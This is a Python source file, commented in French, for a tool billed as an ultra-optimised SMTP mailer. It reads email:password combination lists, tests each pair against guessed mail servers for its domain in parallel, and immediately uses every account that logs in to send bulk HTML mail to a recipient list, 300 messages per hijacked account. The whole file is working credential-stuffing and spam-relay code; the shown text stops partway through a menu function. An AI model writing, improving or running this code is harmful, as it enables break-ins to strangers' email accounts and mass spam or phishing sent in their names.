import smtplib
import os
import time
import threading
import asyncio
import aiosmtplib
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.header import Header
import socket
from typing import List, Tuple, Optional, Dict, Set
import sys
import queue
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import dns.resolver
import hashlib
import json
from collections import defaultdict
import logging

# Configuration du logging pour debug
logging.basicConfig(level=logging.WARNING)

# Codes couleurs ANSI
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    
    # Couleurs principales
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    
    # Couleurs de fond
    BG_RED = '\033[101m'
    BG_GREEN = '\033[102m'
    BG_YELLOW = '\033[103m'
    BG_BLUE = '\033[104m'
    BG_MAGENTA = '\033[105m'
    BG_CYAN = '\033[106m'
    
    # Couleurs personnalisées
    ORANGE = '\033[38;5;208m'
    PURPLE = '\033[38;5;135m'
    LIME = '\033[38;5;154m'
    PINK = '\033[38;5;213m'

class SMTPCache:
    """Cache intelligent pour les résultats SMTP"""
    
    def __init__(self, cache_file: str = "smtp_cache.json"):
        self.cache_file = cache_file
        self.cache = self.load_cache()
        self.domain_cache = {}
        self.mx_cache = {}
        
    def load_cache(self) -> Dict:
        """Charge le cache depuis le fichier"""
        try:
            with open(self.cache_file, 'r') as f:
                return json.load(f)
        except:
            return {}
    
    def save_cache(self):
        """Sauvegarde le cache"""
        try:
            with open(self.cache_file, 'w') as f:
                json.dump(self.cache, f, indent=2)
        except:
            pass
    
    def get_domain_hash(self, domain: str) -> str:
        """Génère un hash pour le domaine"""
        return hashlib.md5(domain.encode()).hexdigest()[:8]
    
    def get_cached_smtp(self, domain: str) -> Optional[List[Tuple[str, int]]]:
        """Récupère les serveurs SMTP en cache"""
        hash_key = self.get_domain_hash(domain)
        return self.cache.get(hash_key)
    
    def cache_smtp(self, domain: str, servers: List[Tuple[str, int]]):
        """Met en cache les serveurs SMTP"""
        hash_key = self.get_domain_hash(domain)
        self.cache[hash_key] = servers
        self.save_cache()

class AdvancedSMTPDetector:
    """Détecteur SMTP ultra-optimisé avec cache et DNS"""
    
    # Base de données étendue des serveurs SMTP
    SMTP_DATABASE = {
        'gmail.com': [
            ('smtp.gmail.com', 587),
            ('smtp.gmail.com', 465)
        ],
        'outlook.com': [
            ('smtp-mail.outlook.com', 587),
            ('smtp.office365.com', 587),
            ('smtp.live.com', 587)
        ],
        'hotmail.com': [
            ('smtp-mail.outlook.com', 587),
            ('smtp.live.com', 587)
        ],
        'yahoo.com': [
            ('smtp.mail.yahoo.com', 587),
            ('smtp.mail.yahoo.com', 465)
        ],
        'yahoo.fr': [
            ('smtp.mail.yahoo.fr', 587),
            ('smtp.mail.yahoo.fr', 465)
        ],
        'icloud.com': [
            ('smtp.mail.me.com', 587),
            ('smtp.mail.me.com', 465)
        ],
        'me.com': [
            ('smtp.mail.me.com', 587),
            ('smtp.mail.me.com', 465)
        ],
        'aol.com': [
            ('smtp.aol.com', 587),
            ('smtp.aol.com', 465)
        ],
        'zoho.com': [
            ('smtp.zoho.com', 587),
            ('smtp.zoho.com', 465)
        ],
        'mail.com': [
            ('smtp.mail.com', 587),
            ('smtp.mail.com', 465)
        ],
        'gmx.com': [
            ('mail.gmx.com', 587),
            ('mail.gmx.com', 465)
        ],
        'yandex.com': [
            ('smtp.yandex.com', 587),
            ('smtp.yandex.com', 465)
        ],
        'protonmail.com': [
            ('127.0.0.1', 1025),
            ('smtp.protonmail.com', 587)
        ],
        # Ajout de nouveaux domaines populaires
        'free.fr': [
            ('smtp.free.fr', 587),
            ('smtp.free.fr', 465)
        ],
        'orange.fr': [
            ('smtp.orange.fr', 587),
            ('smtp.orange.fr', 465)
        ],
        'wanadoo.fr': [
            ('smtp.orange.fr', 587),
            ('smtp.orange.fr', 465)
        ],
        'laposte.net': [
            ('smtp.laposte.net', 587),
            ('smtp.laposte.net', 465)
        ],
        'sfr.fr': [
            ('smtp.sfr.fr', 587),
            ('smtp.sfr.fr', 465)
        ],
        'web.de': [
            ('smtp.web.de', 587),
            ('smtp.web.de', 465)
        ],
        't-online.de': [
            ('securesmtp.t-online.de', 587),
            ('securesmtp.t-online.de', 465)
        ],
        'mail.ru': [
            ('smtp.mail.ru', 587),
            ('smtp.mail.ru', 465)
        ],
        'rambler.ru': [
            ('smtp.rambler.ru', 587),
            ('smtp.rambler.ru', 465)
        ],
        'qq.com': [
            ('smtp.qq.com', 587),
            ('smtp.qq.com', 465)
        ],
        '163.com': [
            ('smtp.163.com', 587),
            ('smtp.163.com', 465)
        ],
        '126.com': [
            ('smtp.126.com', 587),
            ('smtp.126.com', 465)
        ]
    }
    
    def __init__(self):
        self.cache = SMTPCache()
        self.mx_cache = {}
        self.domain_patterns = self._build_domain_patterns()
        
    def _build_domain_patterns(self) -> Dict[str, List[Tuple[str, int]]]:
        """Construit des patterns de domaines pour la détection rapide"""
        patterns = {}
        
        # Patterns pour les domaines Microsoft
        ms_domains = ['outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'passport.com']
        ms_servers = [('smtp-mail.outlook.com', 587), ('smtp.office365.com', 587)]
        for domain in ms_domains:
            patterns[domain] = ms_servers
            
        # Patterns pour les domaines Google
        google_domains = ['gmail.com', 'googlemail.com']
        google_servers = [('smtp.gmail.com', 587), ('smtp.gmail.com', 465)]
        for domain in google_domains:
            patterns[domain] = google_servers
            
        # Patterns pour les domaines Yahoo
        yahoo_domains = ['yahoo.com', 'yahoo.fr', 'yahoo.co.uk', 'yahoo.de', 'ymail.com', 'rocketmail.com']
        for domain in yahoo_domains:
            if domain.endswith('.fr'):
                patterns[domain] = [('smtp.mail.yahoo.fr', 587), ('smtp.mail.yahoo.fr', 465)]
            else:
                patterns[domain] = [('smtp.mail.yahoo.com', 587), ('smtp.mail.yahoo.com', 465)]
                
        return patterns
    
    def get_mx_records(self, domain: str) -> List[str]:
        """Récupère les enregistrements MX d'un domaine"""
        if domain in self.mx_cache:
            return self.mx_cache[domain]
        
        mx_records = []
        try:
            answers = dns.resolver.resolve(domain, 'MX')
            mx_records = [str(rdata.exchange).rstrip('.') for rdata in answers]
            mx_records.sort(key=lambda x: answers[mx_records.index(x + '.')].preference)
        except Exception:
            pass
        
        self.mx_cache[domain] = mx_records
        return mx_records
    
    def get_smtp_servers_for_email(self, email: str) -> List[Tuple[str, int]]:
        """Obtient les serveurs SMTP optimisés pour un email"""
        domain = email.split('@')[1].lower() if '@' in email else ''
        
        if not domain:
            return []
        
        # Vérification du cache
        cached_servers = self.cache.get_cached_smtp(domain)
        if cached_servers:
            return cached_servers
        
        servers = []
        
        # 1. Serveurs connus (priorité haute)
        if domain in self.SMTP_DATABASE:
            servers.extend(self.SMTP_DATABASE[domain])
        
        # 2. Patterns de domaines
        elif domain in self.domain_patterns:
            servers.extend(self.domain_patterns[domain])
        
        # 3. Détection par MX records
        else:
            mx_records = self.get_mx_records(domain)
            for mx in mx_records[:3]:  # Limite à 3 MX records
                # Conversion MX vers SMTP
                smtp_candidates = self._mx_to_smtp(mx)
                servers.extend(smtp_candidates)
            
            # 4. Tentatives génériques si pas de MX
            if not servers:
                servers.extend(self._generate_generic_servers(domain))
        
        # Élimination des doublons en préservant l'ordre
        unique_servers = []
        seen = set()
        for server in servers:
            if server not in seen:
                unique_servers.append(server)
                seen.add(server)
        
        # Mise en cache
        self.cache.cache_smtp(domain, unique_servers)
        
        return unique_servers
    
    def _mx_to_smtp(self, mx: str) -> List[Tuple[str, int]]:
        """Convertit un MX record en serveurs SMTP probables"""
        smtp_servers = []
        
        # Règles de conversion MX -> SMTP
        smtp_candidates = []
        
        # Remplacements courants
        if mx.startswith('mx'):
            smtp_candidates.append(mx.replace('mx', 'smtp', 1))
        elif mx.startswith('mail'):
            smtp_candidates.append(mx.replace('mail', 'smtp', 1))
        
        # Ajout direct
        smtp_candidates.append(mx)
        
        # Préfixes courants
        domain_part = mx.split('.', 1)[1] if '.' in mx else mx
        smtp_candidates.extend([
            f'smtp.{domain_part}',
            f'mail.{domain_part}',
            f'smtp.mail.{domain_part}'
        ])
        
        # Ports à tester
        ports = [587, 465, 25]
        
        for candidate in smtp_candidates:
            for port in ports:
                smtp_servers.append((candidate, port))
        
        return smtp_servers
    
    def _generate_generic_servers(self, domain: str) -> List[Tuple[str, int]]:
        """Génère des serveurs SMTP génériques"""
        generic_servers = []
        
        # Patterns génériques
        patterns = [
            f'smtp.{domain}',
            f'mail.{domain}',
            f'smtp.mail.{domain}',
            f'outgoing.{domain}',
            f'send.{domain}',
            f'out.{domain}'
        ]
        
        # Ports prioritaires
        ports = [587, 465, 25]
        
        for pattern in patterns:
            for port in ports:
                generic_servers.append((pattern, port))
        
        return generic_servers

class FastSMTPTester:
    """Testeur SMTP ultra-rapide avec connexions asynchrones"""
    
    def __init__(self, max_workers: int = 50, timeout: int = 5):
        self.max_workers = max_workers
        self.timeout = timeout
        self.session_cache = {}
        
    async def test_smtp_async(self, smtp_server: str, port: int, email: str, password: str) -> Tuple[bool, str]:
        """Test SMTP asynchrone ultra-rapide"""
        try:
            # Test de connexion rapide
            if port == 587:
                smtp = aiosmtplib.SMTP(hostname=smtp_server, port=port, timeout=self.timeout)
                await smtp.connect()
                await smtp.starttls()
            elif port == 465:
                smtp = aiosmtplib.SMTP(hostname=smtp_server, port=port, timeout=self.timeout, use_tls=True)
                await smtp.connect()
            else:
                smtp = aiosmtplib.SMTP(hostname=smtp_server, port=port, timeout=self.timeout)
                await smtp.connect()
                try:
                    await smtp.starttls()
                except:
                    pass
            
            # Test d'authentification
            await smtp.login(email, password)
            await smtp.quit()
            
            return True, "Connexion réussie"
            
        except Exception as e:
            return False, str(e)
    
    def test_smtp_sync(self, smtp_server: str, port: int, email: str, password: str) -> Tuple[bool, str]:
        """Test SMTP synchrone optimisé"""
        try:
            # Configuration socket optimisée
            old_timeout = socket.getdefaulttimeout()
            socket.setdefaulttimeout(self.timeout)
            
            if port == 587:
                server = smtplib.SMTP(smtp_server, port, timeout=self.timeout)
                server.starttls()
            elif port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port, timeout=self.timeout)
            else:
                server = smtplib.SMTP(smtp_server, port, timeout=self.timeout)
                try:
                    server.starttls()
                except:
                    pass
            
            server.login(email, password)
            server.quit()
            
            socket.setdefaulttimeout(old_timeout)
            return True, "Connexion réussie"
            
        except Exception as e:
            socket.setdefaulttimeout(old_timeout)
            return False, str(e)

class UltraOptimizedSMTPMailer:
    def __init__(self):
        self.detector = AdvancedSMTPDetector()
        self.tester = FastSMTPTester()
        self.working_smtps = []
        self.test_email = ""
        self.sender_name = ""
        self.subject = ""
        self.html_content = ""
        self.recipients = []
        self.email_delay = 0.05  # Délai réduit
        self.sending_active = False
        self.stats = {
            'total_sent': 0,
            'total_failed': 0,
            'smtp_used': 0,
            'start_time': None,
            'end_time': None,
            'validation_time': None
        }
        self.smtp_queue = queue.Queue()
        self.sending_thread = None
        self.lock = threading.Lock()
        self.domain_groups = defaultdict(list)
        
    def print_header(self, title: str, color: str = Colors.CYAN):
        """Affiche un en-tête stylisé"""
        width = 80
        border = '═' * width
        print(f"\n{color}{border}{Colors.RESET}")
        print(f"{color}║{Colors.BOLD}{title.center(width-2)}{Colors.RESET}{color}║{Colors.RESET}")
        print(f"{color}{border}{Colors.RESET}\n")
    
    def print_section(self, title: str, color: str = Colors.BLUE):
        """Affiche une section stylisée"""
        print(f"\n{color}{'─' * 60}{Colors.RESET}")
        print(f"{color}{Colors.BOLD}🔹 {title}{Colors.RESET}")
        print(f"{color}{'─' * 60}{Colors.RESET}")
    
    def print_success(self, message: str):
        """Affiche un message de succès"""
        print(f"{Colors.GREEN}✅ {message}{Colors.RESET}")
    
    def print_error(self, message: str):
        """Affiche un message d'erreur"""
        print(f"{Colors.RED}❌ {message}{Colors.RESET}")
    
    def print_warning(self, message: str):
        """Affiche un avertissement"""
        print(f"{Colors.ORANGE}⚠️  {message}{Colors.RESET}")
    
    def print_info(self, message: str):
        """Affiche une information"""
        print(f"{Colors.CYAN}ℹ️  {message}{Colors.RESET}")
    
    def validate_email(self, email: str) -> bool:
        """Valide le format d'un email"""
        pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        return re.match(pattern, email) is not None
    
    def group_emails_by_domain(self, combinations: List[Tuple[str, str]]) -> Dict[str, List[Tuple[str, str]]]:
        """Groupe les emails par domaine pour optimisation"""
        domain_groups = defaultdict(list)
        
        for email, password in combinations:
            domain = email.split('@')[1].lower() if '@' in email else ''
            domain_groups[domain].append((email, password))
        
        return domain_groups
    
    def load_email_password_combinations(self, file_path: str) -> List[Tuple[str, str]]:
        """Charge les combinaisons email:password depuis un fichier"""
        combinations = []
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            self.print_info(f"Analyse de {len(lines)} lignes...")
            
            for line_num, line in enumerate(lines, 1):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                # Formats supportés: email:password ou email|password
                if ':' in line:
                    parts = line.split(':', 1)
                elif '|' in line:
                    parts = line.split('|', 1)
                else:
                    continue
                
                if len(parts) != 2:
                    continue
                
                email, password = parts[0].strip(), parts[1].strip()
                
                if not self.validate_email(email) or not password:
                    continue
                
                combinations.append((email, password))
        
        except Exception as e:
            self.print_error(f"Erreur lors du chargement: {e}")
            return []
        
        self.print_success(f"{len(combinations)} combinaisons email:password chargées")
        return combinations
    
    def ultra_fast_validation(self, email_password_combinations: List[Tuple[str, str]]):
        """Validation ultra-rapide avec groupement par domaine"""
        self.print_section("🚀 VALIDATION ULTRA-RAPIDE", Colors.MAGENTA)
        
        validation_start = time.time()
        self.stats['start_time'] = datetime.now()
        
        # Groupement par domaine
        domain_groups = self.group_emails_by_domain(email_password_combinations)
        self.print_info(f"📊 {len(domain_groups)} domaines détectés")
        
        # Démarrage du thread d'envoi
        self.sending_thread = threading.Thread(target=self.bulk_sending_worker, daemon=True)
        self.sending_thread.start()
        
        validated_count = 0
        processed_domains = 0
        
        # Traitement par domaine avec ThreadPoolExecutor optimisé
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = []
            
            for domain, combinations in domain_groups.items():
                processed_domains += 1
                print(f"\n{Colors.BLUE}🔍 Domaine {processed_domains}/{len(domain_groups)}: {domain} ({len(combinations)} comptes){Colors.RESET}")
                
                # Obtention des serveurs SMTP pour ce domaine
                smtp_servers = self.detector.get_smtp_servers_for_email(f"test@{domain}")
                
                # Test des combinaisons pour ce domaine
                domain_futures = []
                for email, password in combinations:
                    for smtp_server, port in smtp_servers:
                        future = executor.submit(self.tester.test_smtp_sync, smtp_server, port, email, password)
                        domain_futures.append((future, smtp_server, port, email, password))
                
                # Traitement des résultats du domaine
                for future, smtp_server, port, email, password in domain_futures:
                    try:
                        is_valid, message = future.result(timeout=10)
                        
                        if is_valid:
                            validated_count += 1
                            with self.lock:
                                self.working_smtps.append((smtp_server, port, email, password))
                                self.smtp_queue.put((smtp_server, port, email, password))
                            
                            print(f"  {Colors.GREEN}✅ VALIDÉ #{validated_count}: {email} @ {smtp_server}:{port}{Colors.RESET}")
                            
                            # Démarrage immédiat si premier SMTP validé
                            if validated_count == 1:
                                self.sending_active = True
                                self.print_success("🎉 DÉMARRAGE IMMÉDIAT DE L'ENVOI !")
                            
                            # Arrêt rapide pour ce domaine après première validation
                            break
                        
                    except Exception as e:
                        pass
                
                # Pause courte entre domaines
                time.sleep(0.1)
        
        # Fin de la validation
        self.smtp_queue.put(None)
        validation_time = time.time() - validation_start
        self.stats['validation_time'] = validation_time
        
        self.print_section("📈 RÉSULTATS VALIDATION", Colors.GREEN)
        print(f"{Colors.CYAN}⏱️  Temps de validation: {validation_time:.2f}s{Colors.RESET}")
        print(f"{Colors.GREEN}✅ SMTPs validés: {validated_count}{Colors.RESET}")
        print(f"{Colors.BLUE}📊 Taux de réussite: {validated_count/len(email_password_combinations)*100:.1f}%{Colors.RESET}")
        
        return validated_count > 0
    
    def send_test_email(self, smtp_server: str, port: int, email: str, password: str) -> Tuple[bool, str]:
        """Envoie un email de test optimisé"""
        try:
            msg = MIMEMultipart('alternative')
            msg['From'] = f"{self.sender_name} <{email}>"
            msg['To'] = self.test_email
            msg['Subject'] = Header("🔍 Test SMTP Ultra-Rapide", 'utf-8')
            
            test_html = f"""
            <html>
            <body style="font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px;">
                <div style="max-width: 600px; margin: 0 auto; background: white; border-radius: 10px; padding: 30px;">
                    <h2 style="color: #2c3e50; text-align: center;">🚀 Validation SMTP Ultra-Rapide</h2>
                    <div style="background: #d4edda; padding: 15px; border-radius: 5px; margin: 20px 0;">
                        <strong>✅ Statut:</strong> Serveur SMTP validé en {self.stats.get('validation_time', 0):.2f}s
                    </div>
                    <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
                        <tr><td style="padding: 10px; background: #f8f9fa;"><strong>Serveur:</strong></td><td style="padding: 10px;">{smtp_server}</td></tr>
                        <tr><td style="padding: 10px; background: #f8f9fa;"><strong>Port:</strong></td><td style="padding: 10px;">{port}</td></tr>
                        <tr><td style="padding: 10px; background: #f8f9fa;"><strong>Email:</strong></td><td style="padding: 10px;">{email}</td></tr>
                    </table>
                </div>
            </body>
            </html>
            """
            
            msg.attach(MIMEText(test_html, 'html', 'utf-8'))
            
            # Envoi optimisé
            if port == 587:
                server = smtplib.SMTP(smtp_server, port, timeout=5)
                server.starttls()
            elif port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
            else:
                server = smtplib.SMTP(smtp_server, port, timeout=5)
                try:
                    server.starttls()
                except:
                    pass
            
            server.login(email, password)
            server.send_message(msg)
            server.quit()
            
            return True, "Email de test envoyé"
            
        except Exception as e:
            return False, str(e)
    
    def bulk_sending_worker(self):
        """Worker thread pour l'envoi en masse optimisé"""
        smtp_index = 0
        
        while True:
            try:
                smtp_config = self.smtp_queue.get(timeout=300)
                
                if smtp_config is None:
                    break
                
                if not self.sending_active:
                    continue
                
                smtp_server, port, email, password = smtp_config
                
                # Calcul du lot optimisé
                batch_size = min(300, len(self.recipients) - (smtp_index * 300))
                if batch_size <= 0:
                    break
                
                batch_start = smtp_index * 300
                batch_recipients = self.recipients[batch_start:batch_start + batch_size]
                
                self.print_section(f"📧 ENVOI AVEC SMTP #{smtp_index + 1}", Colors.GREEN)
                print(f"{Colors.CYAN}📧 {email}{Colors.RESET}")
                print(f"{Colors.BLUE}🖥️  {smtp_server}:{port}{Colors.RESET}")
                print(f"{Colors.YELLOW}👥 {len(batch_recipients)} destinataires{Colors.RESET}")
                
                sent_count = self.send_batch_optimized(smtp_server, port, email, password, batch_recipients)
                
                with self.lock:
                    self.stats['total_sent'] += sent_count
                    self.stats['total_failed'] += len(batch_recipients) - sent_count
                    self.stats['smtp_used'] += 1
                
                smtp_index += 1
                
                if smtp_index * 300 >= len(self.recipients):
                    break
                    
            except queue.Empty:
                self.print_warning("Timeout - Arrêt de l'envoi")
                break
            except Exception as e:
                self.print_error(f"Erreur dans le worker: {e}")
        
        self.stats['end_time'] = datetime.now()
        self.print_final_summary()
    
    def send_batch_optimized(self, smtp_server: str, port: int, email: str, password: str, recipients: List[str]) -> int:
        """Envoi de lot ultra-optimisé"""
        sent_count = 0
        
        try:
            # Connexion optimisée
            if port == 587:
                server = smtplib.SMTP(smtp_server, port, timeout=10)
                server.starttls()
            elif port == 465:
                server = smtplib.SMTP_SSL(smtp_server, port, timeout=10)
            else:
                server = smtplib.SMTP(smtp_server, port, timeout=10)
                try:
                    server.starttls()
                except:
                    pass
            
            server.login(email, password)
            
            # Envoi optimisé avec progression
            for i, recipient in enumerate(recipients):
                try:
                    msg = MIMEMultipart('alternative')
                    msg['From'] = f"{self.sender_name} <{email}>"
                    msg['To'] = recipient
                    msg['Subject'] = Header(self.subject, 'utf-8')
                    msg.attach(MIMEText(self.html_content, 'html', 'utf-8'))
                    
                    server.send_message(msg)
                    sent_count += 1
                    
                    # Barre de progression optimisée
                    if i % 10 == 0 or i == len(recipients) - 1:
                        percent = (i + 1) / len(recipients) * 100
                        bar_length = 50
                        filled_length = int(bar_length * (i + 1) // len(recipients))
                        bar = '█' * filled_length + '░' * (bar_length - filled_length)
                        
                        print(f"\r{Colors.CYAN}📧 Envoi: {Colors.GREEN}{bar}{Colors.RESET} {percent:.1f}% ({i + 1}/{len(recipients)})", end='', flush=True)
                    
                    # Délai optimisé
                    time.sleep(self.email_delay)
                    
                except Exception as e:
                    self.print_error(f"Erreur envoi vers {recipient}: {e}")
                    continue
            
            print()  # Nouvelle ligne après la barre de progression
            server.quit()
            
            self.print_success(f"✅ Lot terminé: {sent_count}/{len(recipients)} emails envoyés")
            
        except Exception as e:
            self.print_error(f"Erreur connexion SMTP: {e}")
        
        return sent_count
    
    def print_final_summary(self):
        """Affiche le résumé final ultra-détaillé"""
        self.print_section("📊 RAPPORT FINAL ULTRA-OPTIMISÉ", Colors.MAGENTA)
        
        if self.stats['start_time'] and self.stats['end_time']:
            total_time = (self.stats['end_time'] - self.stats['start_time']).total_seconds()
        else:
            total_time = 0
        
        validation_time = self.stats.get('validation_time', 0)
        sending_time = total_time - validation_time
        
        # Statistiques détaillées
        print(f"{Colors.CYAN}⏱️  Temps total: {total_time:.2f}s{Colors.RESET}")
        print(f"{Colors.BLUE}🔍 Temps validation: {validation_time:.2f}s{Colors.RESET}")
        print(f"{Colors.GREEN}📧 Temps envoi: {sending_time:.2f}s{Colors.RESET}")
        print(f"{Colors.YELLOW}✅ Emails envoyés: {self.stats['total_sent']}{Colors.RESET}")
        print(f"{Colors.RED}❌ Emails échoués: {self.stats['total_failed']}{Colors.RESET}")
        print(f"{Colors.PURPLE}🖥️  SMTPs utilisés: {self.stats['smtp_used']}{Colors.RESET}")
        
        # Calculs de performance
        if total_time > 0:
            emails_per_second = self.stats['total_sent'] / total_time
            print(f"{Colors.LIME}⚡ Vitesse: {emails_per_second:.2f} emails/seconde{Colors.RESET}")
        
        if self.stats['total_sent'] + self.stats['total_failed'] > 0:
            success_rate = (self.stats['total_sent'] / (self.stats['total_sent'] + self.stats['total_failed'])) * 100
            print(f"{Colors.ORANGE}📈 Taux de réussite: {success_rate:.1f}%{Colors.RESET}")
        
        # Recommandations
        print(f"\n{Colors.CYAN}💡 RECOMMANDATIONS:{Colors.RESET}")
        if emails_per_second < 1:
            print(f"{Colors.YELLOW}⚠️  Vitesse faible - Réduire le délai entre emails{Colors.RESET}")
        elif emails_per_second > 10:
            print(f"{Colors.GREEN}🚀 Excellente performance - Optimisation réussie{Colors.RESET}")
        
        if success_rate < 80:
            print(f"{Colors.RED}⚠️  Taux d'échec élevé - Vérifier les destinataires{Colors.RESET}")
        elif success_rate > 95:
            print(f"{Colors.GREEN}✅ Excellent taux de réussite{Colors.RESET}")
    
    def interactive_menu(self):
        """Menu interactif ultra-moderne"""
        self.print_header("🚀 SMTP MAILER ULTRA-OPTIMISÉ v3.0", Colors.MAGENTA)
        
        while True:
            self.print_section("🎯 MENU PRINCIPAL", Colors.CYAN)
            print(f"{Colors.BLUE}1.{Colors.RESET} {Colors.BOLD}Validation rapide + Envoi{Colors.RESET}")
            print(f"{Colors.BLUE}2.{Colors.RESET} {Colors.BOLD}Configuration avancée{Colors.RESET}")
            print(f"{Colors.BLUE}3.{Colors.RESET} {Colors.BOLD}Test unitaire SMTP{Colors.RESET}")
            print(f"{Colors.BLUE}4.{Colors.RESET} {Colors.BOLD}Statistiques système{Colors.RESET}")
            print(f"{Colors.BLUE}5.{Colors.RESET} {Colors.BOLD}Quitter{Colors.RESET}")
            
            choice = input(f"\n{Colors.CYAN}👉 Votre choix: {Colors.RESET}").strip()
            
            if choice == '1':
                self.quick_send_flow()
            elif choice == '2':
                self.advanced_configuration()
            elif choice == '3':
                self.unit_test_smtp()
            elif choice == '4':
                self.system_stats()
            elif choice == '5':
                self.print_success("Au revoir ! 👋")
                break
            else:
                self.print_error("Choix invalide !")
    
    def quick_send_flow(self):
        """Flux d'envoi rapide ultra-optimisé"""
        self.print_section("🚀 ENVOI RAPIDE", Colors.GREEN)
        
        # 1. Chargement des combinaisons
        while True:
            combo_file = input(f"{Colors.CYAN}📁 Fichier combinaisons (email:password): {Colors.RESET}").strip()
            if not combo_file:
                self.print_error("Fichier requis !")
                continue
            
            if not os.path.exists(combo_file):
                self.print_error("Fichier introuvable !")
                continue
            
            combinations = self.load_email_password_combinations(combo_file)
            if combinations:
                break
        
        # 2. Configuration email
        self.test_email = input(f"{Colors.CYAN}📧 Email de test: {Colors.RESET}").strip()
        if not self.validate_email(self.test_email):
            self.print_error("Email de test invalide !")
            return
        
        self.sender_name = input(f"{Colors.CYAN}👤 Nom expéditeur: {Colors.RESET}").strip() or "Expéditeur"
        self.subject = input(f"{Colors.CYAN}📄 Sujet: {Colors.RESET}").strip() or "Message Important"
        
        # 3. Contenu HTML
        while True:
            html_choice = input(f"{Colors.CYAN}📝 Contenu HTML (1=Fichier, 2=Saisie): {Colors.RESET}").strip()
            
            if html_choice == '1':
                html_file = input(f"{Colors.CYAN}📁 Fichier HTML: {Colors.RESET}").strip()
                if os.path.exists(html_file):
                    with open(html_file, 'r', encoding='utf-8') as f:
                        self.html_content = f.read()
                    break
                else:
                    self.print_error("Fichier HTML introuvable !")
            
            elif html_choice == '2':
                self.html_content = input(f"{Colors.CYAN}📝 Contenu HTML: {Colors.RESET}").strip()
                if self.html_content:
                    break
                else:
                    self.print_error("Contenu requis !")
        
        # 4. Liste des destinataires
        while True:
            recipients_file = input(f"{Colors.CYAN}📋 Fichier destinataires: {Colors.RESET}").strip()
            if not recipients_file:
                self.print_error("Fichier requis !")
                continue
            
            if not os.path.exists(recipients_file):
                self.print_error("Fichier introuvable !")
                continue
            
            try:
                with open(recipients_file, 'r', encoding='utf-8') as f:
                    self.recipients = [line.strip() for line in f.readlines() if line.strip() and self.validate_email(line.strip())]
                
                if self.recipients:
                    self.print_success(f"{len(self.recipients)} destinataires chargés")
                    break
                else:
                    self.print_error("Aucun destinataire valide !")
                    
            except Exception as e:
                self.print_error(f"Erreur lecture: {e}")
        
        # 5. Configuration avancée
        delay_input = input(f"{Colors.CYAN}⏱️  Délai entre emails [0.05s]: {Colors.RESET}").strip()
        if delay_input:
            try:
                self.email_delay = float(delay_input)
            except:
                self.email_delay = 0.05
        
        # 6. Confirmation et lancement
        self.print_section("📊 RÉCAPITULATIF", Colors.YELLOW)
        print(f"{Colors.CYAN}📧 Combinaisons: {len(combinations)}{Colors.RESET}")
        print(f"{Colors.CYAN}👥 Destinataires: {len(self.recipients)}{Colors.RESET}")
        print(f"{Colors.CYAN}⏱️  Délai: {self.email_delay}s{Colors.RESET}")
        print(f"{Colors.CYAN}📄 Sujet: {self.subject}{Colors.RESET}")
        
        confirm = input(f"\n{Colors.GREEN}🚀 Lancer l'envoi ? (O/n): {Colors.RESET}").strip().lower()
        if confirm in ['o', 'oui', 'y', 'yes', '']:
            # Validation et envoi
            if self.ultra_fast_validation(combinations):
                self.print_success("🎉 Processus terminé avec succès !")
            else:
                self.print_error("❌ Aucun SMTP validé !")
        else:
            self.print_warning("Opération annulée")
    
    def advanced_configuration(self):
        """Configuration avancée du système"""
        self.print_section("⚙️  CONFIGURATION AVANCÉE", Colors.BLUE)
        
        print(f"{Colors.CYAN}1.{Colors.RESET} Paramètres de performance")
        print(f"{Colors.CYAN}2.{Colors.RESET} Gestion du cache SMTP")
        print(f"{Colors.CYAN}3.{Colors.RESET} Timeouts et connexions")
        print(f"{Colors.CYAN}4.{Colors.RESET} Retour au menu principal")
        
        choice = input(f"\n{Colors.CYAN}👉 Votre choix: {Colors.RESET}").strip()
        
        if choice == '1':
            self.performance_settings()
        elif choice == '2':
            self.cache_management()
        elif choice == '3':
            self.connection_settings()
        elif choice == '4':
            return
        else:
            self.print_error("Choix invalide !")
    
    def performance_settings(self):
        """Paramètres de performance"""
        self.print_section("⚡ PARAMÈTRES DE PERFORMANCE", Colors.GREEN)
        
        print(f"{Colors.CYAN}Délai actuel: {self.email_delay}s{Colors.RESET}")
        print(f"{Colors.CYAN}Workers actuels: {self.tester.max_workers}{Colors.RESET}")
        print(f"{Colors.CYAN}Timeout actuel: {self.tester.timeout}s{Colors.RESET}")
        
        new_delay = input(f"{Colors.CYAN}Nouveau délai [actuel: {self.email_delay}]: {Colors.RESET}").strip()
        if new_delay:
            try:
                self.email_delay = float(new_delay)
                self.print_success(f"Délai mis à jour: {self.email_delay}s")
            except:
                self.print_error("Valeur invalide !")
        
        new_workers = input(f"{Colors.CYAN}Nouveaux workers [actuel: {self.tester.max_workers}]: {Colors.RESET}").strip()
        if new_workers:
            try:
                self.tester.max_workers = int(new_workers)
                self.print_success(f"Workers mis à jour: {self.tester.max_workers}")
            except:
                self.print_error("Valeur invalide !")
    
    def cache_management(self):
        """Gestion du cache SMTP"""
        self.print_section("🗄️  GESTION DU CACHE", Colors.PURPLE)
        
        cache_size = len(self.detector.cache.cache)
        print(f"{Colors.CYAN}Entrées en cache: {cache_size}{Colors.RESET}")
        
        print(f"{Colors.CYAN}1.{Colors.RESET} Vider le cache")
        print(f"{Colors.CYAN}2.{Colors.RESET} Sauvegarder le cache")
        print(f"{Colors.CYAN}3.{Colors.RESET} Afficher le cache")
        print(f"{Colors.CYAN}4.{Colors.RESET} Retour")
        
        choice = input(f"\n{Colors.CYAN}👉 Votre choix: {Colors.RESET}").strip()
        
        if choice == '1':
            self.detector.cache.cache = {}
            self.detector.cache.save_cache()
            self.print_success("Cache vidé !")
